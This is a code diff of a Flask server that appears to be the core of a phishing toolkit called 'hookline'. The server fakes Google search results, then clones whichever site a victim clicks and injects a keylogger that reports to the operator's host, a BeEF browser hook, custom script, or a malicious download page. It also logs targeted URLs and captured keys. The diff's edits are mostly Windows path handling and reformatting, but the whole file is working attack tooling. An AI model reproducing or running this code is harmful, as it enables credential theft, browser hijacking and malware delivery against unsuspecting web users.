@@ -1,15 +1,28 @@
+#-*-coding: utf-8-*-
 #imports
 from flask import Flask, request, render_template, send_file
 from flask_cors import CORS
 import requests
 from shutil import copyfile
+from codecs import open as copen
+from platform import platform
+from os import path
 #clone.py comes with hookline
 import gclone
+
+#OS configuration stuff
+current_platform = platform()
+IS_WINDOWS = False
+if current_platform.startswith("Windows"):
+	IS_WINDOWS = True
+
 
 #display banner
 b = open("banner.txt","r")
 print(b.read())
 b.close
+
+
 
 #the flask server will run on this ip and port
 h = input("ip to run on: ")
@@ -52,7 +65,10 @@ if opt == 2:
 	bhooktmpr = bhooktmp.read()
 	bhooktmp.close()
 	bhooktmpr = bhooktmpr.replace("~bip~",bip).replace("~bport~",bport)
-	bhook = open("static/js/bhook.js","w")
+	if IS_WINDOWS:
+		bhook = open("static\\js\\bhook.js", "w")
+	else:
+		bhook = open("static/js/bhook.js","w")
 	bhook.write(bhooktmpr)
 	bhook.close()
 
@@ -85,7 +101,7 @@ app.config["TEMPLATES_AUTO_RELOAD"] = True
 #robots
 @app.route("/robots.txt")
 def robots():
-    return "User-agent: *\rDisallow: *"
+	return "User-agent: *\rDisallow: *"
 
 #serve tabunder from the yesup popunder library
 @app.route("/u")
@@ -95,24 +111,23 @@ def u():
 #serve google seach 
 @app.route("/search")
 def search(maldown=maldown):
-    a = request.args.get("q")
+	a = request.args.get("q")
 
-    try:
-    	#check for relevant templates
-        open("templates/"+a+".html","r")
-        template = True
-    except:
-        template = False
-    #clone google search
-    gclone.clone(a, template)
-    #Search2.html is served after being updated by clone
-    f = open("activesearch.txt","w")
-    f.write(a)
-    f.close()
-    if opt == 4:
-    	copyfile(maldown,a+"."+maldown.split(".")[1])
-    	maldown = a+"."+maldown.split(".")[1]
-    return send_file("templates/Search2.html")
+	if IS_WINDOWS:
+		template = path.isfile(f"templates\\{a}.html")
+	else:
+		template = path.isfile(f"templates/{a}.html")
+
+	#clone google search
+	gclone.clone(a, template)
+	#Search2.html is served after being updated by clone
+	f = open("activesearch.txt","w")
+	f.write(a)
+	f.close()
+	if opt == 4:
+		copyfile(maldown,a+"."+maldown.split(".")[1])
+		maldown = a+"."+maldown.split(".")[1]
+	return send_file("templates/Search2.html")
 
 #serves premade pages
 @app.route("/temp")
@@ -123,55 +138,56 @@ def tempfunc():
 #generates fake versions on link click
 @app.route("/link")
 def link():
-    url = request.args.get("url")
-    if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
-    	url="https://en.wikipedia.org/wiki/Idiot"
-    r = requests.get(url, allow_redirects=False)
+	url = request.args.get("url")
+	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
+		url="https://en.wikipedia.org/wiki/Idiot"
+	r = requests.get(url, allow_redirects=False)
 
-    #open page in write mode to replace with site clone
-    f = open("templates/page.html","w")
+	#keylogger
+	if opt == 1:
+		scrpt = open("script.html","r")
+		scrpt1 = scrpt.read().replace("#h#",ipb).replace("#p#",str(portb))
+		jsadd = r.text + scrpt1
+	
+	#BeEF
+	if opt == 2:
+		if IS_WINDOWS:
+			scrpt = open("static\\js\\bhook.js","r")
+		else:
+			scrpt = open("static/js/bhook.js","r")
+		jsadd = r.text + scrpt.read()
+	
+	#Custom html or js
+	if opt == 3:
+		scrpt = open(injfname,"r")
+		jsadd = r.text + scrpt.read()
 
-    #keylogger
-    if opt == 1:
-        scrpt = open("script.html","r")
-        scrpt1 = scrpt.read().replace("#h#",ipb).replace("#p#",str(portb))
-        jsadd = r.text + scrpt1
-    
-    #BeEF
-    if opt == 2:
-        scrpt = open("static/js/bhook.js","r")
-        jsadd = r.text + scrpt.read()
-    
-    #Custom html or js
-    if opt == 3:
-    	scrpt = open(injfname,"r")
-    	jsadd = r.text + scrpt.read()
+	if opt == 4:
+		actvsrch = open("activesearch.txt","r")
+		sitenm = actvsrch.read()
+		actvsrch.close()
+		scrpt = open("down.html","r")
+		scrpt1 = scrpt.read()
+		scrpt1 = scrpt1.replace("*search*",sitenm)
+		scrpt1 = scrpt1.replace("*ip*",ipb)
+		scrpt1 = scrpt1.replace("*port*",portb)
+		jsadd = r.text + scrpt1
 
-    if opt == 4:
-    	actvsrch = open("activesearch.txt","r")
-    	sitenm = actvsrch.read()
-    	actvsrch.close()
-    	scrpt = open("down.html","r")
-    	scrpt1 = scrpt.read()
-    	scrpt1 = scrpt1.replace("*search*",sitenm)
-    	scrpt1 = scrpt1.replace("*ip*",ipb)
-    	scrpt1 = scrpt1.replace("*port*",portb)
-    	jsadd = r.text + scrpt1
+	#write out clone with chosen code injected
+	if not "<base" in jsadd:
+		jsadd = jsadd.replace("<head>",f"<head><base href='{url}'>")
 
-    #write out clone with chosen code injected
-    if not "<base" in jsadd:
-    	jsadd = jsadd.replace("<head>","<head><base href='{{url}}'>")
-    f.write(jsadd)
-    f.close()
-    scrpt.close()
 
-    #add the url to our keysfile so we know what site its for
-    with open("keys.txt","a") as keyfile:
-        keyfile.write(url+"\n")
-    keyfile.close()
+	scrpt.close()
 
-    #serve the cloned page
-    return render_template("page.html", url=url)
+	#add the url to our keysfile so we know what site its for
+	with open("keys.txt","a") as keyfile:
+		keyfile.write(url+"\n")
+	keyfile.close()
+
+
+	#serve the cloned page
+	return jsadd
 
 #keylogger
 @app.route("/key")
@@ -197,5 +213,5 @@ def downloads():
 
 #run flask app
 if __name__ == "__main__":
-    app.run(host=h, port=p)
+	app.run(host=h, port=p)
 
